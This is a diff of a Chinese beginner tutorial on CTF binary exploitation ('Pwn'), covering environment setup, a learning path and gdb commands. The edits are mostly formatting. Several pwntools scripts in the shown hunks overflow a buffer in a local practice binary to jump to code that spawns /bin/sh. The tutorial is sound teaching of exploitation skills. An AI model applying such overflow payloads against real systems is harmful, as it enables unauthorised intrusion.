@@ -17,7 +17,7 @@ Pwn 是一个黑客语法的俚语词，是指攻破设备或者系统。发音�
 <div style="display: inline-block; width: 100%; text-align: right;">——百度百科</div>
 </Container>
 
-Pwn 需要的不仅是基本的 C语言、汇编语言以及逆向功底，还有程序运行相关的知识。
+Pwn 需要的不仅是基本的 C 语言、汇编语言以及逆向功底，还有程序运行相关的知识。
 
 ## 0x00. 解决 Pwn 题目的基本流程
 
@@ -31,7 +31,8 @@ Pwn 需要的不仅是基本的 C语言、汇编语言以及逆向功底，还�
 
 ## 0x01. Pwn 环境搭建
 
-- Ubuntu（建议用近几年的 Ubuntu，比如 22.04 LTS, 24.04 LTS）
+请先确保你具备 Ubuntu<span data-desc>（建议用近几年的 Ubuntu，比如 22.04 LTS, 24.04 LTS）</span> 操作系统。随后可以准备以下软件或工具：
+
 - IDA/Ghidra
 - pwntools
 - gdb 及其插件
@@ -56,7 +57,7 @@ Pwn 需要的不仅是基本的 C语言、汇编语言以及逆向功底，还�
 
 ## 0x02. 前期 Pwn 的基本学习路线
 
-首先前置知识有基础的 C 语言、汇编、ELF 程序的加载运行知识
+首先前置知识有基础的 C 语言、汇编、ELF 程序的加载运行知识。
 
 前置 C 语言知识：
 
@@ -223,15 +224,13 @@ chmod +x ./pwn
 
 这句代码的功能就是执行 `/bin/sh`，即获取 shell，我们只要能把程序执行流劫持到这里就能拿到 shell 了。
 
-之后我们开始写利用脚本（Exploit）。创建 `exp.py` 文件。
-
-首先写上最基本的框架：
+之后我们开始写利用脚本（Exploit）。创建 `exp.py` 文件，首先写上最基本的框架：
 
 ```python
 from pwn import *
 
 context.log_level='debug'
-context(arch='amd64',os='linux')
+context(arch='amd64', os='linux')
 
 ELFpath = './pwn'
 p = process(ELFpath)
@@ -250,13 +249,13 @@ p.interactive()
 from pwn import *
 
 context.log_level='debug'
-context(arch='amd64',os='linux')
+context(arch='amd64', os='linux')
 
 ELFpath = './pwn'
 p = process(ELFpath)
 gdb.attach(p)
 
-p.send(b'a'*0x10 + p64(0) + p64(0x4011BD)) # [!code highlight]
+p.send(b'a'*0x10 + p64(0) + p64(0x4011BD))# [!code highlight]
 
 p.interactive()
 ```
@@ -270,7 +269,7 @@ p.interactive()
 下面是 gdb/pwndbg 常用的命令：
 
 - `ni`: 执行到当前函数的下一条汇编指令
-- `si`: 单步步入，和 `ni` 的区别就是 call<span class='desc-text'>（调用）</span>函数的时候会一步步进入所 call 的函数，而不是像 `ni` 那样直接跳过
+- `si`: 单步步入，和 `ni` 的区别就是 call<span data-desc>（调用）</span>函数的时候会一步步进入所 call 的函数，而不是像 `ni` 那样直接跳过
 - `fin`: 执行至当前函数结束
 - `q`: 退出gdb
 - `vmmap`: 查看当前内存中的每个段的信息
@@ -298,13 +297,13 @@ p.interactive()
 from pwn import *
 
 context.log_level='debug'
-context(arch='amd64',os='linux')
+context(arch='amd64', os='linux')
 
 ELFpath = './pwn'
 p = process(ELFpath)
 gdb.attach(p)
 
-p.send(b'a'*0x10 + p64(0) + p64(0x4011C2)) # [!code focus]
+p.send(b'a'*0x10 + p64(0) + p64(0x4011C2))# [!code focus]
 
 p.interactive()
 ```
